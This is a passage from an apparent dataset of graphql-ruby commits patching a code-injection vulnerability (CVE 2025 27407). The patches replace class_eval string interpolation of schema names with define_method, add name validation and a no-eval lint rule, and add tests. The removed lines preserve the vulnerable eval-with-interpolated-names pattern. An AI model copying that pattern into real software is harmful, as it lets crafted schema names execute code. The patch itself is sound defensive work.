<<-RUBY, __FILE__, __LINE__\n-                # frozen_string_literal: true\n-                def #{resolve_method_name}(**args)\n-                  field_instance = self.class.get_field(\"#{field_definition.name}\")\n-                  context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n-                end\n-              RUBY\n+              define_field_resolve_method(owner, resolve_method_name, field_definition.name)\n             end\n           end\n         end\n\n@@ -367,6 +361,13 @@\ndef resolve_type(types, ast_node)\n           end\n         end\n \n+        def define_field_resolve_method(owner, method_name, field_name)\n+          owner.define_method(method_name) { |**args|\n+            field_instance = self.class.get_field(field_name)\n+            context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n+          }\n+        end\n+\n         def resolve_type_name(type)\n           case type\n           when GraphQL::Language::Nodes::TypeName\n```\n\nFilename: lib/graphql/schema/enum_value.rb:\n```\n@@ -49,7 +49,7 @@\ndef initialize(graphql_name, desc = nil, owner:, ast_node: nil, description: nil\n         @ast_node = ast_node\n \n         if block_given?\n-          instance_eval(&block)\n+          instance_exec(self, &block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/field.rb:\n```\n@@ -222,6 +222,7 @@\ndef initialize(type: nil, name: nil, owner: nil, null: nil, field: nil, function\n         name_s = -name.to_s\n         @underscored_name = -Member::BuildType.underscore(name_s)\n         @name = -(camelize ? Member::BuildType.camelize(name_s) : name_s)\n+        NameValidator.validate!(@name)\n         @description = description\n         if field.is_a?(GraphQL::Schema::Field)\n           raise ArgumentError, \"Instead of passing a field as `field:`, use `add_field(field)` to add an already-defined field.\"\n```\n\nFilename: lib/graphql/schema/input_object.rb:\n```\n@@ -125,12 +125,8 @@\nclass << self\n         def argument(*args, **kwargs, &block)\n           argument_defn = super(*args, **kwargs, &block)\n           # Add a method access\n-          method_name = argument_defn.keyword\n-          class_eval <<-RUBY, __FILE__, __LINE__\n-            def #{method_name}\n-              self[#{method_name.inspect}]\n-            end\n-          RUBY\n+          define_accessor_method(argument_defn.keyword)\n+          argument_defn\n         end\n \n         def to_graphql\n\n@@ -239,6 +235,13 @@\ndef coerce_result(value, ctx)\n \n           result\n         end\n+\n+        private\n+\n+        def define_accessor_method(method_name)\n+          define_method(method_name) { self[method_name] }\n+          alias_method(method_name, method_name)\n+        end\n       end\n     end\n   end\n```\n\nFilename: lib/graphql/version.rb:\n```\n@@ -1,4 +1,4 @@\n# frozen_string_literal: true\n module GraphQL\n-  VERSION = \"1.11.7\"\n+  VERSION = \"1.11.8\"\n end\n```\n\nFilename: spec/graphql/schema/loader_spec.rb:\n```\n@@ -389,4 +389,153 @@\ndef assert_deep_equal(expected_type, actual_type)\n       assert_equal arg.default_value, { 'id' => nil, 'int' => nil, 'float' => nil, 'enum' => nil, 'sub' => nil, 'bool' => nil, 'bigint' => nil }\n     end\n   end\n+\n+  it \"validates field argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"something-wrong\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"SCALAR\",\n+                        \"name\" => \"Int\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"something-wrong\"\n+  end\n+\n+  it \"validates field names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"bad.int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad.int\"\n+  end\n+\n+  it \"validates input object argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"inputObject\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"INPUT_OBJECT\",\n+                        \"name\" => \"SomeInputObject\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            },\n+            {\n+              \"kind\" => \"INPUT_OBJECT\",\n+              \"name\" => \"SomeInputObject\",\n+              \"description\" => nil,\n+              \"inputFields\" => [\n+                {\n+                  \"name\"=>\"bad, input\",\n+                  \"type\"=> { \"kind\" => \"SCALAR\", \"name\" => \"String\"},\n+                  \"defaultValue\"=> nil,\n+                  \"description\" => nil,\n+                },\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad, input\"\n+  end\n end\n```",
                "url": "https://github.com/rmosolgo/graphql-ruby/commit/2d2f4ed1f79472f8eed29c864b039649e1de238f"
            },
            {
                "content": "Merge commit from fork\n\n[2.2] fix CVE 2025 27407\n\nFilename: .rubocop.yml:\n```\n@@ -1,5 +1,6 @@\nrequire:\n   - ./cop/development/none_without_block_cop\n+  - ./cop/development/no_eval_cop\n   - ./cop/development/no_focus_cop\n   - ./lib/graphql/rubocop/graphql/default_null_true\n   - ./lib/graphql/rubocop/graphql/default_required_true\n\n@@ -51,6 +52,10 @@\nDevelopment/NoneWithoutBlockCop:\n     - \"lib/**/*\"\n     - \"spec/**/*\"\n \n+Development/NoEvalCop:\n+  Include:\n+    - \"lib/**/*\"\n+\n Development/NoFocusCop:\n   Include:\n     - \"spec/**/*\"\n```\n\nFilename: benchmark/run.rb:\n```\n@@ -110,12 +110,16 @@\ndef self.build_large_schema\n         end\n \n         obj_ts = 100.times.map do |n|\n+          input_obj_t = Class.new(GraphQL::Schema::InputObject) do\n+            graphql_name(\"Input#{n}\")\n+            argument :arg, String\n+          end\n           obj_t = Class.new(GraphQL::Schema::Object) do\n             graphql_name(\"Object#{n}\")\n             implements(*int_ts)\n             20.times do |n2|\n               field :\"field#{n2}\", String do\n-                argument :arg, String\n+                argument :input, input_obj_t\n               end\n \n             end\n\n@@ -152,8 +156,9 @@\ndef self.profile_boot\n     end\n     StackProf::Report.new(result).print_text\n \n+    retained_schema = nil\n     report = MemoryProfiler.report do\n-      build_large_schema\n+      retained_schema = build_large_schema\n     end\n \n     report.pretty_print\n```\n\nFilename: cop/development/no_eval_cop.rb:\n```\n@@ -0,0 +1,18 @@\n+# frozen_string_literal: true\n+require 'rubocop'\n+\n+module Cop\n+  module Development\n+    class NoEvalCop < RuboCop::Cop::Base\n+      MSG_TEMPLATE = \"Don't use `%{eval_method_name}` which accepts strings and may result evaluating unexpected code. Use `%{exec_method_name}` instead, and pass a block.\"\n+\n+      def on_send(node)\n+        case node.method_name\n+        when :module_eval, :class_eval, :instance_eval\n+          message = MSG_TEMPLATE % { eval_method_name: node.method_name, exec_method_name: node.method_name.to_s.sub(\"eval\", \"exec\").to_sym }\n+          add_offense node, message: message\n+        end\n+      end\n+    end\n+  end\n+end\n```\n\nFilename: lib/graphql/language/nodes.rb:\n```\n@@ -138,6 +138,8 @@\ndef merge!(new_options)\n         end\n \n         class << self\n+          # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n           # Add a default `#visit_method` and `#children_method_name` using the class name\n           def inherited(child_class)\n             super\n\n@@ -316,6 +318,7 @@\ndef self.from_a(filename, line, col, #{(scalar_method_names + @children_methods.\n               RUBY\n             end\n           end\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/language/static_visitor.rb:\n```\n@@ -22,39 +22,6 @@\ndef visit\n         end\n       end\n \n-      # We don't use `alias` here because it breaks `super`\n-      def self.make_visit_methods(ast_node_class)\n-        node_method = ast_node_class.visit_method\n-        children_of_type = ast_node_class.children_of_type\n-        child_visit_method = :\"#{node_method}_children\"\n-\n-        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n-          # The default implementation for visiting an AST node.\n-          # It doesn't _do_ anything, but it continues to visiting the node's children.\n-          # To customize this hook, override one of its make_visit_methods (or the base method?)\n-          # in your subclasses.\n-          #\n-          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n-          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n-          # @return [void]\n-          def #{node_method}(node, parent)\n-            #{\n-              if method_defined?(child_visit_method)\n-                \"#{child_visit_method}(node)\"\n-              elsif children_of_type\n-                children_of_type.map do |child_accessor, child_class|\n-                  \"node.#{child_accessor}.each do |child_node|\n-                    #{child_class.visit_method}(child_node, node)\n-                  end\"\n-                end.join(\"\\n\")\n-              else\n-                \"\"\n-              end\n-            }\n-          end\n-        RUBY\n-      end\n-\n       def on_document_children(document_node)\n         document_node.children.each do |child_node|\n           visit_method = child_node.visit_method\n\n@@ -123,6 +90,41 @@\ndef on_argument_children(new_node)\n         end\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n+      # We don't use `alias` here because it breaks `super`\n+      def self.make_visit_methods(ast_node_class)\n+        node_method = ast_node_class.visit_method\n+        children_of_type = ast_node_class.children_of_type\n+        child_visit_method = :\"#{node_method}_children\"\n+\n+        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n+          # The default implementation for visiting an AST node.\n+          # It doesn't _do_ anything, but it continues to visiting the node's children.\n+          # To customize this hook, override one of its make_visit_methods (or the base method?)\n+          # in your subclasses.\n+          #\n+          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n+          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n+          # @return [void]\n+          def #{node_method}(node, parent)\n+            #{\n+              if method_defined?(child_visit_method)\n+                \"#{child_visit_method}(node)\"\n+              elsif children_of_type\n+                children_of_type.map do |child_accessor, child_class|\n+                  \"node.#{child_accessor}.each do |child_node|\n+                    #{child_class.visit_method}(child_node, node)\n+                  end\"\n+                end.join(\"\\n\")\n+              else\n+                \"\"\n+              end\n+            }\n+          end\n+        RUBY\n+      end\n+\n       [\n         Language::Nodes::Argument,\n         Language::Nodes::Directive,\n\n@@ -162,6 +164,8 @@\ndef on_argument_children(new_node)\n       ].each do |ast_node_class|\n         make_visit_methods(ast_node_class)\n       end\n+\n+      # rubocop:disable Development/NoEvalCop\n     end\n   end\n end\n```\n\nFilename: lib/graphql/language/visitor.rb:\n```\n@@ -61,61 +61,6 @@\ndef visit\n         end\n       end\n \n-      # We don't use `alias` here because it breaks `super`\n-      def self.make_visit_methods(ast_node_class)\n-        node_method = ast_node_class.visit_method\n-        children_of_type = ast_node_class.children_of_type\n-        child_visit_method = :\"#{node_method}_children\"\n-\n-        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n-          # The default implementation for visiting an AST node.\n-          # It doesn't _do_ anything, but it continues to visiting the node's children.\n-          # To customize this hook, override one of its make_visit_methods (or the base method?)\n-          # in your subclasses.\n-          #\n-          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n-          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n-          # @return [Array, nil] If there were modifications, it returns an array of new nodes, otherwise, it returns `nil`.\n-          def #{node_method}(node, parent)\n-            if node.equal?(DELETE_NODE)\n-              # This might be passed to `super(DELETE_NODE, ...)`\n-              # by a user hook, don't want to keep visiting in that case.\n-              [node, parent]\n-            else\n-              new_node = node\n-              #{\n-                if method_defined?(child_visit_method)\n-                  \"new_node = #{child_visit_method}(new_node)\"\n-                elsif children_of_type\n-                  children_of_type.map do |child_accessor, child_class|\n-                    \"node.#{child_accessor}.each do |child_node|\n-                      new_child_and_node = #{child_class.visit_method}_with_modifications(child_node, new_node)\n-                      # Reassign `node` in case the child hook makes a modification\n-                      if new_child_and_node.is_a?(Array)\n-                        new_node = new_child_and_node[1]\n-                      end\n-                    end\"\n-                  end.join(\"\\n\")\n-                else\n-                  \"\"\n-                end\n-              }\n-\n-              if new_node.equal?(node)\n-                [node, parent]\n-              else\n-                [new_node, parent]\n-              end\n-            end\n-          end\n-\n-          def #{node_method}_with_modifications(node, parent)\n-            new_node_and_new_parent = #{node_method}(node, parent)\n-            apply_modifications(node, parent, new_node_and_new_parent)\n-          end\n-        RUBY\n-      end\n-\n       def on_document_children(document_node)\n         new_node = document_node\n         document_node.children.each do |child_node|\n\n@@ -216,6 +161,63 @@\ndef on_argument_children(new_node)\n         new_node\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n+      # We don't use `alias` here because it breaks `super`\n+      def self.make_visit_methods(ast_node_class)\n+        node_method = ast_node_class.visit_method\n+        children_of_type = ast_node_class.children_of_type\n+        child_visit_method = :\"#{node_method}_children\"\n+\n+        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n+          # The default implementation for visiting an AST node.\n+          # It doesn't _do_ anything, but it continues to visiting the node's children.\n+          # To customize this hook, override one of its make_visit_methods (or the base method?)\n+          # in your subclasses.\n+          #\n+          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n+          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n+          # @return [Array, nil] If there were modifications, it returns an array of new nodes, otherwise, it returns `nil`.\n+          def #{node_method}(node, parent)\n+            if node.equal?(DELETE_NODE)\n+              # This might be passed to `super(DELETE_NODE, ...)`\n+              # by a user hook, don't want to keep visiting in that case.\n+              [node, parent]\n+            else\n+              new_node = node\n+              #{\n+                if method_defined?(child_visit_method)\n+                  \"new_node = #{child_visit_method}(new_node)\"\n+                elsif children_of_type\n+                  children_of_type.map do |child_accessor, child_class|\n+                    \"node.#{child_accessor}.each do |child_node|\n+                      new_child_and_node = #{child_class.visit_method}_with_modifications(child_node, new_node)\n+                      # Reassign `node` in case the child hook makes a modification\n+                      if new_child_and_node.is_a?(Array)\n+                        new_node = new_child_and_node[1]\n+                      end\n+                    end\"\n+                  end.join(\"\\n\")\n+                else\n+                  \"\"\n+                end\n+              }\n+\n+              if new_node.equal?(node)\n+                [node, parent]\n+              else\n+                [new_node, parent]\n+              end\n+            end\n+          end\n+\n+          def #{node_method}_with_modifications(node, parent)\n+            new_node_and_new_parent = #{node_method}(node, parent)\n+            apply_modifications(node, parent, new_node_and_new_parent)\n+          end\n+        RUBY\n+      end\n+\n       [\n         Language::Nodes::Argument,\n         Language::Nodes::Directive,\n\n@@ -256,6 +258,8 @@\ndef on_argument_children(new_node)\n         make_visit_methods(ast_node_class)\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       private\n \n       def apply_modifications(node, parent, new_node_and_new_parent)\n```\n\nFilename: lib/graphql/schema/argument.rb:\n```\n@@ -53,6 +53,7 @@\ndef from_resolver?\n       def initialize(arg_name = nil, type_expr = nil, desc = nil, required: true, type: nil, name: nil, loads: nil, description: nil, ast_node: nil, default_value: NOT_CONFIGURED, as: nil, from_resolver: false, camelize: true, prepare: nil, owner:, validates: nil, directives: nil, deprecation_reason: nil, replace_null_with_default: false, &definition_block)\n         arg_name ||= name\n         @name = -(camelize ? Member::BuildType.camelize(arg_name.to_s) : arg_name.to_s)\n+        NameValidator.validate!(@name)\n         @type_expr = type_expr || type\n         @description = desc || description\n         @null = required != true\n\n@@ -88,11 +89,8 @@\ndef initialize(arg_name = nil, type_expr = nil, desc = nil, required: true, type\n         end\n \n         if definition_block\n-          if definition_block.arity == 1\n-            instance_exec(self, &definition_block)\n-          else\n-            instance_eval(&definition_block)\n-          end\n+          # `self` will still be self, it will also be the first argument to the block:\n+          instance_exec(self, &definition_block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/build_from_definition.rb:\n```\n@@ -451,17 +451,18 @@\ndef build_fields(owner, field_definitions, type_resolver, default_resolve:)\n \n             # Don't do this for interfaces\n             if default_resolve\n-              owner.class_eval <<-RUBY, __FILE__, __LINE__\n-                # frozen_string_literal: true\n-                def #{resolve_method_name}(**args)\n-                  field_instance = self.class.get_field(\"#{field_definition.name}\")\n-                  context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n-                end\n-              RUBY\n+              define_field_resolve_method(owner, resolve_method_name, field_definition.name)\n             end\n           end\n         end\n \n+        def define_field_resolve_method(owner, method_name, field_name)\n+          owner.define_method(method_name) { |**args|\n+            field_instance = self.class.get_field(field_name)\n+            context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n+          }\n+        end\n+\n         def build_resolve_type(lookup_hash, directives, missing_type_handler)\n           resolve_type_proc = nil\n           resolve_type_proc = ->(ast_node) {\n```\n\nFilename: lib/graphql/schema/directive.rb:\n```\n@@ -99,7 +99,7 @@\ndef repeatable(new_value)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @default_graphql_name ||= nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/enum_value.rb:\n```\n@@ -47,7 +47,7 @@\ndef initialize(graphql_name, desc = nil, owner:, ast_node: nil, directives: nil,\n         end\n \n         if block_given?\n-          instance_eval(&block)\n+          instance_exec(self, &block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/field.rb:\n```\n@@ -233,7 +233,7 @@\ndef initialize(type: nil, name: nil, owner: nil, null: nil, description: NOT_CON\n \n         @underscored_name = -Member::BuildType.underscore(name_s)\n         @name = -(camelize ? Member::BuildType.camelize(name_s) : name_s)\n-\n+        NameValidator.validate!(@name)\n         @description = description\n         @type = @owner_type = @own_validators = @own_directives = @own_arguments = @arguments_statically_coercible = nil # these will be prepared later if necessary\n```\n\nFilename: lib/graphql/schema/interface.rb:\n```\n@@ -29,7 +29,7 @@\ndef definition_methods(&block)\n             const_set(:DefinitionMethods, defn_methods_module)\n             extend(self::DefinitionMethods)\n           end\n-          self::DefinitionMethods.module_eval(&block)\n+          self::DefinitionMethods.module_exec(&block)\n         end\n \n         # @see {Schema::Warden} hides interfaces without visible implementations\n```\n\nFilename: lib/graphql/schema/member/has_directives.rb:\n```\n@@ -6,7 +6,7 @@\nclass Member\n       module HasDirectives\n         def self.extended(child_cls)\n           super\n-          child_cls.module_eval { self.own_directives = nil }\n+          child_cls.module_exec { self.own_directives = nil }\n         end\n \n         def inherited(child_cls)\n```\n\nFilename: lib/graphql/schema/member/has_fields.rb:\n```\n@@ -183,7 +183,7 @@\ndef self.extended(child_class)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @own_fields ||= nil\n             @field_class ||= nil\n           end\n```\n\nFilename: lib/graphql/schema/member/has_interfaces.rb:\n```\n@@ -133,7 +133,7 @@\ndef self.extended(child_class)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @own_interface_type_memberships ||= nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/member/scoped.rb:\n```\n@@ -30,7 +30,7 @@\ndef reauthorize_scoped_objects(new_value = nil)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @reauthorize_scoped_objects = nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/member/type_system_helpers.rb:\n```\n@@ -43,7 +43,7 @@\ndef kind\n         private\n \n         def inherited(subclass)\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @to_non_null_type ||= nil\n             @to_list_type ||= nil\n           end\n```\n\nFilename: lib/graphql/tracing/appoptics_trace.rb:\n```\n@@ -28,6 +28,8 @@\ndef self.version\n         Gem::Version.new('1.0.0')\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       [\n         'lex',\n         'parse',\n\n@@ -55,6 +57,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def execute_field(query:, field:, ast_node:, arguments:, object:)\n         return_type = field.type.unwrap\n         trace_field = if return_type.kind.scalar? || return_type.kind.enum?\n```\n\nFilename: lib/graphql/tracing/appsignal_trace.rb:\n```\n@@ -13,6 +13,8 @@\ndef initialize(set_action_name: false, **rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -43,6 +45,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key)\n         Appsignal.instrument(platform_key) do\n           yield\n```\n\nFilename: lib/graphql/tracing/data_dog_trace.rb:\n```\n@@ -20,6 +20,8 @@\ndef initialize(tracer: nil, analytics_enabled: false, analytics_sample_rate: 1.0\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => 'lex.graphql',\n         'parse' => 'parse.graphql',\n\n@@ -69,6 +71,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def execute_field_span(span_key, query, field, ast_node, arguments, object)\n         return_type = field.type.unwrap\n         trace_field = if return_type.kind.scalar? || return_type.kind.enum?\n```\n\nFilename: lib/graphql/tracing/notifications_trace.rb:\n```\n@@ -16,6 +16,8 @@\ndef initialize(engine:, **rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -39,6 +41,8 @@\ndef #{trace_method}(**metadata, &blk)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       include PlatformTrace\n     end\n   end\n```\n\nFilename: lib/graphql/tracing/platform_trace.rb:\n```\n@@ -39,6 +39,9 @@\ndef self.included(child_class)\n           include(BaseKeyCache)\n         }\n         child_class.const_set(:KeyCache, key_methods_class)\n+\n+        # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n         [:execute_field, :execute_field_lazy].each do |field_trace_method|\n           if !child_class.method_defined?(field_trace_method)\n             child_class.module_eval <<-RUBY, __FILE__, __LINE__\n\n@@ -91,6 +94,8 @@\ndef #{rt_trace_method}(query:, type:, object:)\n               end\n             RUBY\n           end\n+\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/tracing/prometheus_trace.rb:\n```\n@@ -13,6 +13,8 @@\ndef initialize(client: PrometheusExporter::Client.default, keys_whitelist: [\"exe\n         super(**rest)\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => \"graphql.lex\",\n         'parse' => \"graphql.parse\",\n\n@@ -30,6 +32,8 @@\ndef #{trace_method}(**data, &block)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key, &block)\n         instrument_execution(platform_key, \"execute_field\", &block)\n       end\n```\n\nFilename: lib/graphql/tracing/scout_trace.rb:\n```\n@@ -16,6 +16,8 @@\ndef initialize(set_transaction_name: false, **_rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -45,6 +47,7 @@\ndef #{trace_method}(**data)\n         end\n         RUBY\n       end\n+      # rubocop:enable Development/NoEvalCop\n \n       def platform_execute_field(platform_key, &block)\n         self.class.instrument(\"GraphQL\", platform_key, INSTRUMENT_OPTS, &block)\n```\n\nFilename: lib/graphql/tracing/sentry_trace.rb:\n```\n@@ -23,6 +23,8 @@\ndef execute_query(**data)\n         instrument_execution(\"graphql.execute\", \"execute_query\", data) { super }\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"graphql.lex\",\n         \"parse\" => \"graphql.parse\",\n\n@@ -39,6 +41,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key, &block)\n         instrument_execution(platform_key, \"execute_field\", &block)\n       end\n```\n\nFilename: lib/graphql/tracing/statsd_trace.rb:\n```\n@@ -11,6 +11,8 @@\ndef initialize(statsd:, **rest)\n         super(**rest)\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => \"graphql.lex\",\n         'parse' => \"graphql.parse\",\n\n@@ -30,6 +32,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key, &block)\n         @statsd.time(platform_key, &block)\n       end\n```\n\nFilename: lib/graphql/types/relay/connection_behaviors.rb:\n```\n@@ -13,7 +13,7 @@\ndef self.included(child_class)\n           child_class.node_nullable(true)\n           child_class.edges_nullable(true)\n           child_class.edge_nullable(true)\n-          child_class.module_eval {\n+          child_class.module_exec {\n             self.edge_type = nil\n             self.node_type = nil\n             self.edge_class = nil\n```\n\nFilename: lib/graphql/types/relay/edge_behaviors.rb:\n```\n@@ -8,7 +8,7 @@\ndef self.included(child_class)\n           child_class.description(\"An edge in a connection.\")\n           child_class.field(:cursor, String, null: false, description: \"A cursor for use in pagination.\")\n           child_class.extend(ClassMethods)\n-          child_class.class_eval { self.node_type = nil }\n+          child_class.class_exec { self.node_type = nil }\n           child_class.node_nullable(true)\n         end\n```\n\nFilename: lib/graphql/version.rb:\n```\n@@ -1,4 +1,4 @@\n# frozen_string_literal: true\n module GraphQL\n-  VERSION = \"2.2.16\"\n+  VERSION = \"2.2.17\"\n end\n```\n\nFilename: spec/graphql/schema/loader_spec.rb:\n```\n@@ -398,4 +398,153 @@\ndef assert_deep_equal(expected_type, actual_type)\n       assert_equal arg.default_value, { 'id' => nil, 'int' => nil, 'float' => nil, 'enum' => nil, 'sub' => nil, 'bool' => nil, 'bigint' => nil }\n     end\n   end\n+\n+  it \"validates field argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"something-wrong\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"SCALAR\",\n+                        \"name\" => \"Int\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"something-wrong\"\n+  end\n+\n+  it \"validates field names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"bad.int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad.int\"\n+  end\n+\n+  it \"validates input object argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              